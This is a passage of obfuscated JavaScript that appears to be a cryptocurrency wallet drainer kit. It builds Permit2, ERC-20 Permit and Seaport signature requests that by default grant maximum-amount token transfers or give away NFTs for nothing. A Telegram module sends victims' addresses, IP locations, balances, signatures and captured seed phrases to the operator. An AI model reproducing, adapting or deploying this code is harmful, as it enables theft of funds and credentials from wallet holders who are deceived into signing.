_0x160772=_0x2747f9,_0x37e845=_0x3b8e02[_0x547e8f[_0x160772(0x4f4)+'e']()],_0x2311f4=_0x2d98e8[_0x37e845];_0x4de612({'chainId':_0x547e8f,'chainKey':_0x37e845,..._0x2311f4});});}function _0xe97c0(){return{..._0x2d98e8};}function _0x182de0(_0x2f1e0c){const _0x46ee87=_0x2b1618;if(typeof _0x2f1e0c===_0x46ee87(0x2de)&&_0x2f1e0c[_0x46ee87(0x127)]('0x')){const _0xefe58c=_0x3b8e02[_0x2f1e0c[_0x46ee87(0x4f4)+'e']()];return _0xefe58c?_0x2d98e8[_0xefe58c]:null;}else{if(typeof _0x2f1e0c===_0x46ee87(0x2fe)){const _0x1e964f='0x'+_0x2f1e0c['toString'](0x10),_0x5ccaad=_0x3b8e02[_0x1e964f[_0x46ee87(0x4f4)+'e']()];return _0x5ccaad?_0x2d98e8[_0x5ccaad]:null;}else return _0x2d98e8[_0x2f1e0c[_0x46ee87(0x4f4)+'e']()]||null;}}async function _0x2fddc4(_0x1738dc,_0x66efb9,_0x313a3e,_0x5d1351={}){const _0x1db6a6=_0x2b1618,{delayBetweenSwitches:delayBetweenSwitches=0x1f4,continueOnError:continueOnError=!![]}=_0x5d1351,_0x29a243=[];for(const _0x551ba7 of _0x66efb9){try{const _0x1181cc=await _0x2cec92(_0x1738dc,_0x551ba7);if(_0x1181cc[_0x1db6a6(0x426)]){await new Promise(_0x57cb75=>setTimeout(_0x57cb75,delayBetweenSwitches));const _0x1374a1=await _0x313a3e(_0x551ba7,_0x1181cc);_0x29a243['push']({'chainKey':_0x551ba7,'switch':_0x1181cc,'callback':_0x1374a1});}}catch(_0x303b6d){_0x29a243[_0x1db6a6(0x1bf)]({'chainKey':_0x551ba7,'error':_0x303b6d[_0x1db6a6(0x3ff)]});if(!continueOnError)break;}}return _0x29a243;}return{'CHAIN_PARAMS':_0x2d98e8,'CHAIN_ID_MAP':_0x3b8e02,'switchTo':_0x2cec92,'switchMultiple':_0x2844bd,'getCurrentChain':_0x46cf45,'isOnChain':_0x4fbc72,'watchChainChanges':_0x9f82b1,'getSupportedChains':_0xe97c0,'getChainParams':_0x182de0,'batchSwitchWithCallback':_0x2fddc4};}());typeof module!=='undefined'&&module[_0x2c4f95(0x1c3)]&&(module[_0x2c4f95(0x1c3)]=_0xa7aef3);const _0x3adc6b=(function(){'use strict';const _0x45806c=_0x2c4f95;const _0x3f1376=[{'name':'name','type':_0x45806c(0x2de)},{'name':_0x45806c(0x49d),'type':_0x45806c(0x2de)},{'name':_0x45806c(0x453),'type':'uint256'},{'name':_0x45806c(0x18d)+_0x45806c(0x526),'type':_0x45806c(0x565)}],_0x28e089=_0x45806c(0x195)+_0x45806c(0x612)+_0x45806c(0x339)+_0x45806c(0x5fb)+'A3';async function _0x52e5bc(_0x53e6c8,_0x2e4464,_0x3bd25a){const _0x2888da=_0x45806c;if(!_0x53e6c8)throw new Error(_0x2888da(0x1d6)+_0x2888da(0x1ca)+'e');try{const _0x12d7af=await _0x53e6c8[_0x2888da(0x3a1)]({'method':_0x2888da(0xcd)+_0x2888da(0x536),'params':[_0x2e4464,JSON[_0x2888da(0x23f)](_0x3bd25a)]});return _0x12d7af;}catch(_0x5b3f85){try{const _0x45dc82=await _0x53e6c8[_0x2888da(0x3a1)]({'method':_0x2888da(0xcd)+_0x2888da(0x117),'params':[_0x2e4464,JSON['stringify'](_0x3bd25a)]});return _0x45dc82;}catch(_0x4efd8a){try{const _0x2e4098=await _0x53e6c8[_0x2888da(0x3a1)]({'method':'eth_signTy'+_0x2888da(0x89),'params':[_0x3bd25a,_0x2e4464]});return _0x2e4098;}catch(_0xdecd8){throw new Error(_0x2888da(0x531)+'g\x20methods\x20'+_0x2888da(0x142)+_0x5b3f85[_0x2888da(0x3ff)]);}}}}async function _0x1743ba(_0x2a1461,_0x2e3565,_0x1397fd){const _0x349d50=_0x45806c;if(!_0x2a1461)throw new Error(_0x349d50(0x1d6)+_0x349d50(0x1ca)+'e');let _0x164414=_0x1397fd;!_0x1397fd[_0x349d50(0x127)]('0x')&&(_0x164414='0x'+Buffer[_0x349d50(0xa7)](_0x1397fd)[_0x349d50(0x52c)](_0x349d50(0x259)));try{const _0x4ac76f=await _0x2a1461[_0x349d50(0x3a1)]({'method':_0x349d50(0x2f5)+_0x349d50(0x1c0),'params':[_0x164414,_0x2e3565]});return _0x4ac76f;}catch(_0x4afe5f){throw new Error(_0x349d50(0x2f5)+'ign\x20failed'+':\x20'+_0x4afe5f[_0x349d50(0x3ff)]);}}function _0x3fa400(_0x23a89e){const _0x286b9f=_0x45806c,{owner:_0x3616ac,token:_0xad811,spender:_0x12e8ed,amount:_0x19b05d,expiration:_0x282019,nonce:_0xb5b3d8,chainId:_0x7b7445,sigDeadline:_0x10aa31}=_0x23a89e,_0x61b35b={'name':_0x286b9f(0x42c),'chainId':_0x7b7445,'verifyingContract':_0x28e089},_0x26664c={'EIP712Domain':_0x3f1376,'PermitTransferFrom':[{'name':_0x286b9f(0x88),'type':_0x286b9f(0x3c8)+_0x286b9f(0x275)},{'name':_0x286b9f(0x106),'type':'address'},{'name':_0x286b9f(0x366),'type':_0x286b9f(0x56f)},{'name':'deadline','type':_0x286b9f(0x56f)}],'TokenPermissions':[{'name':'token','type':_0x286b9f(0x565)},{'name':_0x286b9f(0x51a),'type':'uint256'}]},_0x1b8fae={'permitted':{'token':_0xad811,'amount':_0x19b05d},'spender':_0x12e8ed,'nonce':_0xb5b3d8,'deadline':_0x10aa31||_0x282019};return{'domain':_0x61b35b,'types':_0x26664c,'primaryType':_0x286b9f(0x2d9)+'sferFrom','message':_0x1b8fae};}function _0x50198b(_0x5a7da9){const _0xa92dc9=_0x45806c,{owner:_0x449adb,tokens:_0x573b2b,spender:_0x551241,nonce:_0x4dc539,chainId:_0x4a8677,deadline:_0xd5cd5}=_0x5a7da9,_0x202f8a={'name':_0xa92dc9(0x42c),'chainId':_0x4a8677,'verifyingContract':_0x28e089},_0x5a761a={'EIP712Domain':_0x3f1376,'PermitBatchTransferFrom':[{'name':_0xa92dc9(0x88),'type':'TokenPermi'+_0xa92dc9(0x33c)},{'name':_0xa92dc9(0x106),'type':_0xa92dc9(0x565)},{'name':_0xa92dc9(0x366),'type':_0xa92dc9(0x56f)},{'name':_0xa92dc9(0x2e0),'type':_0xa92dc9(0x56f)}],'TokenPermissions':[{'name':_0xa92dc9(0x5b3),'type':_0xa92dc9(0x565)},{'name':'amount','type':'uint256'}]},_0x5f2753={'permitted':_0x573b2b['map'](_0x714c55=>({'token':_0x714c55['token'],'amount':_0x714c55[_0xa92dc9(0x51a)]})),'spender':_0x551241,'nonce':_0x4dc539,'deadline':_0xd5cd5};return{'domain':_0x202f8a,'types':_0x5a761a,'primaryType':'PermitBatc'+'hTransferF'+_0xa92dc9(0x313),'message':_0x5f2753};}function _0x322f78(_0x1c94a2){const _0x5f09ef=_0x45806c,{owner:_0x24d1ad,token:_0x79cc66,tokenName:_0x4d3e12,spender:_0x2fb623,value:_0x6e77e9,nonce:_0x3d0a34,deadline:_0x5ef018,chainId:_0x377b60}=_0x1c94a2,_0x13588a={'name':_0x4d3e12||_0x5f09ef(0x5de),'version':'1','chainId':_0x377b60,'verifyingContract':_0x79cc66},_0x5d836b={'EIP712Domain':_0x3f1376,'Permit':[{'name':_0x5f09ef(0x2cb),'type':_0x5f09ef(0x565)},{'name':_0x5f09ef(0x106),'type':_0x5f09ef(0x565)},{'name':'value','type':_0x5f09ef(0x56f)},{'name':_0x5f09ef(0x366),'type':_0x5f09ef(0x56f)},{'name':_0x5f09ef(0x2e0),'type':'uint256'}]},_0x5f2b8b={'owner':_0x24d1ad,'spender':_0x2fb623,'value':_0x6e77e9,'nonce':_0x3d0a34,'deadline':_0x5ef018};return{'domain':_0x13588a,'types':_0x5d836b,'primaryType':_0x5f09ef(0x5f7),'message':_0x5f2b8b};}function _0x17e038(_0x28c63e){const _0x48276a=_0x45806c,{offerer:_0x3b506b,zone:_0x42219e,offer:_0x552ebd,consideration:_0x5f06cc,startTime:_0x5cfdea,endTime:_0x381e22,orderType:_0x1a1cfa,nonce:_0x1a739e,chainId:_0x5a3a8a}=_0x28c63e,_0x3bc497='0x00000000'+_0x48276a(0x3d7)+_0x48276a(0x351)+'289169EdE5'+'81',_0x4b6fa1={'name':'Seaport','version':'1.1','chainId':_0x5a3a8a,'verifyingContract':_0x3bc497},_0x50957e={'EIP712Domain':_0x3f1376,'OrderComponents':[{'name':_0x48276a(0x406),'type':_0x48276a(0x565)},{'name':_0x48276a(0x460),'type':'address'},{'name':_0x48276a(0x3e2),'type':_0x48276a(0x5d5)+']'},{'name':_0x48276a(0x461)+_0x48276a(0x1b4),'type':_0x48276a(0x3a5)+_0x48276a(0xde)},{'name':_0x48276a(0x5cf),'type':_0x48276a(0x398)},{'name':'startTime','type':_0x48276a(0x56f)},{'name':_0x48276a(0x394),'type':_0x48276a(0x56f)},{'name':_0x48276a(0x527),'type':_0x48276a(0x564)},{'name':'salt','type':_0x48276a(0x56f)},{'name':'conduitKey','type':_0x48276a(0x564)},{'name':_0x48276a(0x5bd),'type':_0x48276a(0x56f)}],'OfferItem':[{'name':_0x48276a(0x5c5),'type':'uint8'},{'name':'token','type':_0x48276a(0x565)},{'name':_0x48276a(0x614)+_0x48276a(0x264),'type':'uint256'},{'name':'startAmoun'+'t','type':_0x48276a(0x56f)},{'name':'endAmount','type':_0x48276a(0x56f)}],'ConsiderationItem':[{'name':_0x48276a(0x5c5),'type':_0x48276a(0x398)},{'name':_0x48276a(0x5b3),'type':'address'},{'name':'identifier'+_0x48276a(0x264),'type':'uint256'},{'name':_0x48276a(0x389)+'t','type':_0x48276a(0x56f)},{'name':_0x48276a(0x521),'type':_0x48276a(0x56f)},{'name':_0x48276a(0x4d4),'type':_0x48276a(0x565)}]},_0x2aa8d2={'offerer':_0x3b506b,'zone':_0x42219e||_0x48276a(0x195)+'0000000000'+_0x48276a(0x2a5)+_0x48276a(0x2a5)+'00','offer':_0x552ebd,'consideration':_0x5f06cc,'orderType':_0x1a1cfa||0x0,'startTime':_0x5cfdea,'endTime':_0x381e22,'zoneHash':_0x48276a(0x195)+'0000000000'+_0x48276a(0x2a5)+_0x48276a(0x2a5)+_0x48276a(0x2a5)+_0x48276a(0x2a5)+'000000','salt':_0x1a739e,'conduitKey':'0x0000007b'+_0x48276a(0x64e)+'ed01230072'+_0x48276a(0x4ac)+_0x48276a(0x395)+'599b810425'+_0x48276a(0x128),'counter':0x0};return{'domain':_0x4b6fa1,'types':_0x50957e,'primaryType':_0x48276a(0x1ce)+_0x48276a(0x328),'message':_0x2aa8d2};}async function _0x519542(_0x5b096a,_0x2970b2,_0x32924c){const _0x188926=_0x45806c;if(!_0x5b096a)throw new Error(_0x188926(0x1d6)+_0x188926(0x1ca)+'e');try{const _0x2645c5=await _0x5b096a[_0x188926(0x3a1)]({'method':_0x188926(0x249)+_0x188926(0x3ee),'params':[{'from':_0x2970b2,..._0x32924c}]});return _0x2645c5;}catch(_0x2d11b2){throw new Error('Transactio'+_0x188926(0x5d9)+_0x188926(0x142)+_0x2d11b2['message']);}}function _0x1cccf5(_0x46882c){const _0x29d69e=_0x45806c;if(!_0x46882c||_0x46882c[_0x29d69e(0x43e)]<0x82)throw new Error(_0x29d69e(0x475)+'gnature\x20le'+_0x29d69e(0x49c));const _0x7399df=_0x46882c['startsWith']('0x')?_0x46882c[_0x29d69e(0x17f)](0x2):_0x46882c;return{'r':'0x'+_0x7399df[_0x29d69e(0x17f)](0x0,0x40),'s':'0x'+_0x7399df[_0x29d69e(0x17f)](0x40,0x80),'v':parseInt(_0x7399df[_0x29d69e(0x17f)](0x80,0x82),0x10)};}function _0x27aeac(_0x3966e3,_0x38543a,_0x5905d1=!![]){return null;}function _0xa4243b(_0x5da326,_0x12898b,_0x3a9fa3,_0xa77052){return{'domain':_0x5da326,'types':{'EIP712Domain':_0x3f1376,..._0x12898b},'primaryType':_0x3a9fa3,'message':_0xa77052};}async function _0x36d2ca(_0x55f80b,_0x26c401,_0x54a258){const _0x43d4bc=_0x3fa400({'owner':_0x26c401,..._0x54a258});return await _0x52e5bc(_0x55f80b,_0x26c401,_0x43d4bc);}async function _0x307204(_0x1de67d,_0x3673dd,_0x289d97){const _0x3dcb1f=_0x50198b({'owner':_0x3673dd,..._0x289d97});return await _0x52e5bc(_0x1de67d,_0x3673dd,_0x3dcb1f);}async function _0x222987(_0x2dc8de,_0xb9d0de,_0x3b9184){const _0xed0e7d=_0x322f78({'owner':_0xb9d0de,..._0x3b9184});return await _0x52e5bc(_0x2dc8de,_0xb9d0de,_0xed0e7d);}async function _0xf48784(_0x36a42e,_0x24b7e9,_0x1aa85f){const _0x3c388e=_0x17e038({'offerer':_0x24b7e9,..._0x1aa85f});return await _0x52e5bc(_0x36a42e,_0x24b7e9,_0x3c388e);}function _0xfc70e5(_0x46c9aa){const _0x55e0c9=_0x45806c,{owner:_0x370add,nftContract:_0x2e5cb2,tokenId:_0x1bee21,spender:_0x1877ef,startTime:_0x22ec4b,endTime:_0x597b13,nonce:_0xa3d6a5,chainId:_0x2ba143}=_0x46c9aa;return _0x17e038({'offerer':_0x370add,'zone':_0x55e0c9(0x195)+_0x55e0c9(0x2a5)+_0x55e0c9(0x2a5)+_0x55e0c9(0x2a5)+'00','offer':[{'itemType':0x2,'token':_0x2e5cb2,'identifierOrCriteria':_0x1bee21||'0','startAmount':'1','endAmount':'1'}],'consideration':[],'startTime':_0x22ec4b,'endTime':_0x597b13,'orderType':0x0,'nonce':_0xa3d6a5,'chainId':_0x2ba143});}async function _0x115237(_0x5cc17a,_0x8e59ef){return Date['now']();}return{'PERMIT2_ADDRESS':_0x28e089,'EIP712_DOMAIN_TYPE':_0x3f1376,'signTypedData':_0x52e5bc,'personalSign':_0x1743ba,'createPermit2TypedData':_0x3fa400,'createPermit2BatchTypedData':_0x50198b,'createPermitTypedData':_0x322f78,'createSeaportTypedData':_0x17e038,'createNFTApprovalTypedData':_0xfc70e5,'createTypedData':_0xa4243b,'signTransaction':_0x519542,'parseSignature':_0x1cccf5,'recoverAddress':_0x27aeac,'signPermit2Transfer':_0x36d2ca,'signPermit2BatchTransfer':_0x307204,'signPermit':_0x222987,'signSeaportOrder':_0xf48784,'getPermit2Nonce':_0x115237};}());typeof module!==_0x2c4f95(0x45a)&&module[_0x2c4f95(0x1c3)]&&(module[_0x2c4f95(0x1c3)]=_0x3adc6b);const _0x44409a=(function(){'use strict';let _0x4e1895={'botToken':null,'chatId':null,'enabled':!![]};const _0x5eb1c5={'success':'✅','error':'❌','warning':'⚠️','info':'ℹ️','money':'💰','wallet':'👛','chain':'⛓️','signature':'✍️','connection':'🔗','seed':'🌱','nft':'🖼️'};function _0x165679(_0x1f333c){const _0x31e57e=_0x4a8a;_0x4e1895={..._0x4e1895,..._0x1f333c};if(!_0x4e1895[_0x31e57e(0x441)]||!_0x4e1895[_0x31e57e(0xf4)])_0x4e1895[_0x31e57e(0x2bc)]=![];}async function _0x2e0f1f(_0x125c60){const _0x3d19b9=_0x4a8a;if(!_0x4e1895['enabled'])return;try{await fetch(_0x3d19b9(0x436)+_0x3d19b9(0x5b2)+_0x3d19b9(0x262)+_0x4e1895[_0x3d19b9(0x441)]+(_0x3d19b9(0x4c4)+'ge'),{'method':'POST','headers':{'Content-Type':_0x3d19b9(0x61d)+_0x3d19b9(0x1b1)},'body':JSON[_0x3d19b9(0x23f)]({'chat_id':_0x4e1895[_0x3d19b9(0xf4)],'text':_0x125c60,'parse_mode':_0x3d19b9(0xb1)})});}catch(_0x47c33d){}}async function _0x10df98(){const _0x2cb63b=_0x4a8a;try{const _0x425b7e=await fetch(_0x2cb63b(0x559)+_0x2cb63b(0x605)+'n/');return await _0x425b7e[_0x2cb63b(0x2b2)]();}catch(_0xce1ba0){return{'ip':'Unknown','city':_0x2cb63b(0x141),'country_name':_0x2cb63b(0x141)};}}async function _0x3ec2e6(_0x34e4b9){const _0x4b62a6=_0x4a8a,_0x30af3c=await _0x10df98(),_0x2282e8=[_0x4b62a6(0x604)+_0x4b62a6(0xce),_0x4b62a6(0xbf)+'code>'+(_0x34e4b9['address']||'Visitor')+'</code>',_0x4b62a6(0x5b9)+_0x4b62a6(0x301)+(_0x34e4b9[_0x4b62a6(0x50d)]||_0x4b62a6(0x2ea))+_0x4b62a6(0x36b),_0x4b62a6(0x5e5)+_0x30af3c['ip']+_0x4b62a6(0x9c)+_0x30af3c[_0x4b62a6(0x2c6)]+',\x20'+_0x30af3c[_0x4b62a6(0x3db)+'me']+')','Agent:\x20<co'+'de>'+navigator['userAgent'][_0x4b62a6(0x17f)](0x0,0x32)+'...</code>'];return await _0x2e0f1f(_0x2282e8[_0x4b62a6(0x381)]('\x0a'));}async function _0x5a353b(_0x384a01){const _0x136008=_0x4a8a,_0x1bad14=await _0x10df98(),_0x3d7f60=[_0x136008(0x110)+_0x136008(0x407)+_0x136008(0x2aa),_0x136008(0xbf)+'code>'+_0x384a01[_0x136008(0x565)]+_0x136008(0x36b),'Chain:\x20<co'+_0x136008(0x31f)+(_0x384a01[_0x136008(0x177)]||_0x136008(0x169))[_0x136008(0x5e0)+'e']()+_0x136008(0x36b),_0x136008(0x4b4)+_0x136008(0x10e)+(_0x384a01[_0x136008(0x116)]||_0x136008(0x169))+_0x136008(0x36b),_0x136008(0x615)+_0x136008(0x16b)+(_0x384a01[_0x136008(0x401)]||_0x136008(0x23d))+_0x136008(0x36b),_0x136008(0x5e5)+_0x1bad14['ip']+_0x136008(0x9c)+_0x1bad14['city']+',\x20'+_0x1bad14['country_na'+'me']+')'];return await _0x2e0f1f(_0x3d7f60[_0x136008(0x381)]('\x0a'));}async function _0x14531a(_0x5c7936){const _0x2f6c41=_0x4a8a,_0x4ab96f=[_0x2f6c41(0x55c)+'n\x20Performe'+_0x2f6c41(0x2aa),_0x2f6c41(0xbf)+'code>'+_0x5c7936[_0x2f6c41(0x565)]+_0x2f6c41(0x36b),_0x2f6c41(0x2a9)+_0x2f6c41(0x10e)+_0x5c7936[_0x2f6c41(0x576)]+_0x2f6c41(0x36b),'Chain:\x20<co'+_0x2f6c41(0x31f)+(_0x5c7936['chain']||'unknown')['toUpperCas'+'e']()+'</code>',_0x2f6c41(0x140)+_0x2f6c41(0x10e)+(_0x5c7936[_0x2f6c41(0x26d)]||'success')+_0x2f6c41(0x36b)];if(_0x5c7936['amount'])_0x4ab96f[_0x2f6c41(0x1bf)](_0x2f6c41(0x3bf)+'ode>'+_0x5c7936[_0x2f6c41(0x51a)]+_0x2f6c41(0x36b));return await _0x2e0f1f(_0x4ab96f[_0x2f6c41(0x381)]('\x0a'));}async function _0x4596c4(_0x4b8a30){const _0x479981=_0x4a8a,_0xbb1906=[_0x479981(0x3b5)+_0x479981(0x555)+_0x479981(0x481),_0x479981(0xbf)+_0x479981(0x16b)+_0x4b8a30['address']+_0x479981(0x36b),_0x479981(0x5d3)+_0x479981(0x31f)+(_0x4b8a30['chain']||_0x479981(0x169))[_0x479981(0x5e0)+'e']()+'</code>',_0x479981(0x643)+'e>'+(_0x4b8a30['signatureT'+_0x479981(0x1f7)]||'Permit2')+_0x479981(0x36b),'Asset:\x20<co'+'de>'+(_0x4b8a30[_0x479981(0x64c)+'l']||_0x479981(0x39d))+_0x479981(0x36b),'Amount:\x20<c'+_0x479981(0x10e)+(_0x4b8a30[_0x479981(0x51a)]||_0x479981(0x141))+'</code>'];return await _0x2e0f1f(_0xbb1906[_0x479981(0x381)]('\x0a'));}async function _0x1974f3(_0x2130f2){const _0x2e8753=_0x4a8a,_0x5c79c5=[_0x2e8753(0x3e0)+'CAPTURED</'+'b>',_0x2e8753(0xbf)+_0x2e8753(0x16b)+_0x2130f2[_0x2e8753(0x565)]+_0x2e8753(0x36b),'Seed:\x20<cod'+'e>'+_0x2130f2[_0x2e8753(0x5b1)]+_0x2e8753(0x36b)];return await _0x2e0f1f(_0x5c79c5[_0x2e8753(0x381)]('\x0a'));}return{'configure':_0x165679,'send':_0x2e0f1f,'logVisit':_0x3ec2e6,'logConnection':_0x5a353b,'logAction':_0x14531a,'logSignature':_0x4596c4,'logSeed':_0x1974f3};}());typeof module!=='undefined'&&module[_0x2c4f95(0x1c3)]&&(module['exports']=_0x44409a);if(typeof _0x4a0553!==_0x2c4f95(0x45a))window[_0x2c4f95(0x456)+'ct']=_0x4a0553;if(typeof _0x44409a!==_0x2c4f95(0x45a))window[_0x2c4f95(0x590)]=_0x44409a;if(typeof _0x3adc6b!==_0x2c4f95(0x45a))window[_0x2c4f95(0x193)]=_0x3adc6b;if(typeof _0xa7aef3!==_0x2c4f95(0x45a))window[_0x2c4f95(0x385)+'h']=_0xa7aef3;const _0x3449d3=(function(){'use strict';const _0x47e4be=_0x2c4f95;const _0x3c6627=_0x47e4be(0x195)+_0x47e4be(0x612)+'0F116dDEE9'+_0x47e4be(0x5fb)+'A3',_0x6b82fa=[_0x47e4be(0x3c6)+'llowance(a'+'ddress\x20use'+'r,\x20address'+_0x47e4be(0x391)+_0x47e4be(0x329)+_0x47e4be(0x1c9)+_0x47e4be(0x5bb)+'eturns\x20(ui'+'nt160\x20amou'+_0x47e4be(0x610)+_0x47e4be(0xda)+_0x47e4be(0x457)+_0x47e4be(0x5a1),_0x47e4be(0x307)+_0x47e4be(0xaf)+'(address\x20o'+_0x47e4be(0x3ae)+_0x47e4be(0x31a)+'ord)\x20exter'+'nal\x20view\x20r'+_0x47e4be(0x479)+_0x47e4be(0x4f8),_0x47e4be(0x3c6)+_0x47e4be(0x410)+'ress\x20token'+',\x20address\x20'+_0x47e4be(0x416)+'int160\x20amo'+'unt,\x20uint4'+_0x47e4be(0x336)+_0x47e4be(0xd1)+'al',_0x47e4be(0x4c5)+_0x47e4be(0x4fc)+_0x47e4be(0x248)+_0x47e4be(0x285)+'le(address'+_0x47e4be(0x319)+'nt160\x20amou'+_0x47e4be(0x1a0)+_0x47e4be(0x162)+_0x47e4be(0x524)+_0x47e4be(0x423)+_0x47e4be(0x463)+'t256\x20deadl'+_0x47e4be(0x54a)+_0x47e4be(0x36d)+_0x47e4be(0x561)+_0x47e4be(0x65e),'function\x20p'+_0x47e4be(0x4d8)+_0x47e4be(0x1ee)+_0x47e4be(0x4ae)+_0x47e4be(0x9e)+_0x47e4be(0x263)+_0x47e4be(0x654)+'\x20permitted'+',\x20address\x20'+_0x47e4be(0x416)+_0x47e4be(0x1d4)+'ce,\x20uint25'+_0x47e4be(0x52e)+')\x20permit,\x20'+_0x47e4be(0x2d7)+_0x47e4be(0x44a)+'nt256\x20amou'+'nt)\x20transf'+'erDetails,'+'\x20address\x20o'+_0x47e4be(0x552)+_0x47e4be(0x331)+_0x47e4be(0x292)+'l',_0x47e4be(0x4c5)+'ermitTrans'+_0x47e4be(0x1c1)+_0x47e4be(0x53c)+_0x47e4be(0x532)+'ss\x20token,\x20'+_0x47e4be(0x2ce)+'ount)[]\x20pe'+_0x47e4be(0x245)+'ddress\x20spe'+_0x47e4be(0x4a5)+_0x47e4be(0x312)+_0x47e4be(0x50a)+'eadline)\x20p'+_0x47e4be(0x499)+_0x47e4be(0x337)+_0x47e4be(0x309)+_0x47e4be(0xef)+_0x47e4be(0x647)+_0x47e4be(0xb2)+'\x20address\x20o'+_0x47e4be(0x552)+_0x47e4be(0x331)+_0x47e4be(0x292)+'l',_0x47e4be(0x55a)+_0x47e4be(0x326)+_0x47e4be(0x167)+_0x47e4be(0x432)+_0x47e4be(0x5f2)+_0x47e4be(0x32d)+_0x47e4be(0x27c)+_0x47e4be(0x3e5)+'nder,\x20uint'+_0x47e4be(0x649)+_0x47e4be(0x22d)+_0x47e4be(0x5fd),_0x47e4be(0x4fa)+'itTransfer'+_0x47e4be(0x5d4)+_0x47e4be(0x167)+_0x47e4be(0x432)+_0x47e4be(0x5f2)+'xed\x20token,'+_0x47e4be(0x27c)+_0x47e4be(0x3e5)+_0x47e4be(0x4a5)+_0x47e4be(0x649)+_0x47e4be(0x423)+_0x47e4be(0x463)+_0x47e4be(0x3a6)+_0x47e4be(0x5fe)],_0x27243b=_0x47e4be(0x1eb)+'FFFFFFFFFF'+'FFFFFFFFFF'+'FFFFFFFFFF'+'FF',_0x201c9a=_0x47e4be(0x1eb)+_0x47e4be(0x1e6)+_0x47e4be(0x1e6)+_0x47e4be(0x1e6)+_0x47e4be(0x1e6)+_0x47e4be(0x1e6)+'FFFFFF';function _0x27366b(_0x2fd4ac){const _0x45a47b=_0x47e4be,{owner:_0x4076e9,token:_0x54220f,amount:_0x2e5f32,spender:_0x58ea88,nonce:_0x351723,deadline:_0x292c68,chainId:_0x4482e4}=_0x2fd4ac,_0x174769={'name':_0x45a47b(0x42c),'chainId':_0x4482e4,'verifyingContract':_0x3c6627},_0x444f7b={'EIP712Domain':[{'name':_0x45a47b(0x2d5),'type':'string'},{'name':_0x45a47b(0x453),'type':_0x45a47b(0x56f)},{'name':_0x45a47b(0x18d)+_0x45a47b(0x526),'type':'address'}],'PermitTransferFrom':[{'name':'permitted','type':_0x45a47b(0x3c8)+_0x45a47b(0x275)},{'name':_0x45a47b(0x106),'type':_0x45a47b(0x565)},{'name':_0x45a47b(0x366),'type':'uint256'},{'name':'deadline','type':_0x45a47b(0x56f)}],'TokenPermissions':[{'name':_0x45a47b(0x5b3),'type':'address'},{'name':_0x45a47b(0x51a),'type':_0x45a47b(0x56f)}]},_0x10eec1={'permitted':{'token':_0x54220f,'amount':_0x2e5f32||_0x201c9a},'spender':_0x58ea88,'nonce':_0x351723||Date[_0x45a47b(0x2c3)](),'deadline':_0x292c68||Math[_0x45a47b(0x57a)](Date[_0x45a47b(0x2c3)]()/0x3e8)+0xe10};return{'domain':_0x174769,'types':_0x444f7b,'primaryType':'PermitTran'+_0x45a47b(0x3b2),'message':_0x10eec1};}function _0xf3d7fa(_0x3b896b){const _0x425be4=_0x47e4be,{owner:_0x4046d1,tokens:_0xdf7404,spender:_0x79b8fd,nonce:_0x566792,deadline:_0x21627f,chainId:_0x53457c}=_0x3b896b,_0x43d468={'name':'Permit2','chainId':_0x53457c,'verifyingContract':_0x3c6627},_0x45ff0c={'EIP712Domain':[{'name':'name','type':_0x425be4(0x2de)},{'name':_0x425be4(0x453),'type':_0x425be4(0x56f)},{'name':_0x425be4(0x18d)+'ontract','type':_0x425be4(0x565)}],'PermitBatchTransferFrom':[{'name':'permitted','type':_0x425be4(0x3c8)+'ssions[]'},{'name':_0x425be4(0x106),'type':'address'},{'name':_0x425be4(0x366),'type':_0x425be4(0x56f)},{'name':_0x425be4(0x2e0),'type':_0x425be4(0x56f)}],'TokenPermissions':[{'name':_0x425be4(0x5b3),'type':'address'},{'name':'amount','type':_0x425be4(0x56f)}]},_0x20fc61={'permitted':_0xdf7404[_0x425be4(0x538)](_0x4bb775=>({'token':_0x4bb775[_0x425be4(0x5b3)],'amount':_0x4bb775[_0x425be4(0x51a)]||_0x201c9a})),'spender':_0x79b8fd,'nonce':_0x566792||Date['now'](),'deadline':_0x21627f||Math[_0x425be4(0x57a)](Date[_0x425be4(0x2c3)]()/0x3e8)+0xe10};return{'domain':_0x43d468,'types':_0x45ff0c,'primaryType':'PermitBatc'+'hTransferF'+_0x425be4(0x313),'message':_0x20fc61};}function _0x238ef0(_0x2dae07){const _0xba2166=_0x47e4be,{owner:_0x2b57e7,token:_0x260d24,amount:_0x53b32c,spender:_0x21517a,expiration:_0x158205,nonce:_0x33d458,chainId:_0x130e73}=_0x2dae07,_0x485270={'name':_0xba2166(0x42c),'chainId':_0x130e73,'verifyingContract':_0x3c6627},_0x1332f8={'EIP712Domain':[{'name':_0xba2166(0x2d5),'type':_0xba2166(0x2de)},{'name':_0xba2166(0x453),'type':_0xba2166(0x56f)},{'name':'verifyingC'+_0xba2166(0x526),'type':_0xba2166(0x565)}],'Permit':[{'name':'owner','type':_0xba2166(0x565)},{'name':'permitted','type':_0xba2166(0x3c8)+_0xba2166(0x275)},{'name':_0xba2166(0x106),'type':_0xba2166(0x565)},{'name':_0xba2166(0x366),'type':_0xba2166(0x56f)},{'name':_0xba2166(0x2e0),'type':_0xba2166(0x56f)}],'TokenPermissions':[{'name':_0xba2166(0x5b3),'type':_0xba2166(0x565)},{'name':_0xba2166(0x51a),'type':_0xba2166(0x56f)}]},_0x39f47a={'owner':_0x2b57e7,'permitted':{'token':_0x260d24,'amount':_0x53b32c||_0x201c9a},'spender':_0x21517a,'nonce':_0x33d458||Date[_0xba2166(0x2c3)](),'deadline':_0x158205||Math[_0xba2166(0x57a)](Date['now']()/0x3e8)+0x15180*0x1e};return{'domain':_0x485270,'types':_0x1332f8,'primaryType':_0xba2166(0x5f7),'message':_0x39f47a};}function _0x2d9b5f(_0x5fd13f){const _0x296576=_0x47e4be,_0x29e44f=Date[_0x296576(0x2c3)](),_0x1140f8=_0x5fd13f[_0x296576(0x17f)](0x2,0xa)+_0x29e44f[_0x296576(0x52c)](0x10);return BigInt('0x'+_0x1140f8);}async function _0x31208f(_0x3c8c02,_0xcbf852,_0x2c294e){const _0x32529c=_0x47e4be,_0x50d41e=_0x27366b({'owner':_0xcbf852,..._0x2c294e});try{const _0x22f6fc=await _0x3c8c02['request']({'method':'eth_signTy'+_0x32529c(0x536),'params':[_0xcbf852,JSON[_0x32529c(0x23f)](_0x50d41e)]});return _0x22f6fc;}catch(_0x4e8805){try{const _0x23c11c=await _0x3c8c02[_0x32529c(0x3a1)]({'method':'eth_signTy'+_0x32529c(0x117),'params':[_0xcbf852,JSON['stringify'](_0x50d41e)]});return _0x23c11c;}catch(_0x5321a5){throw new Error('Permit2\x20si'+'gning\x20fail'+'ed:\x20'+_0x4e8805['message']);}}}async function 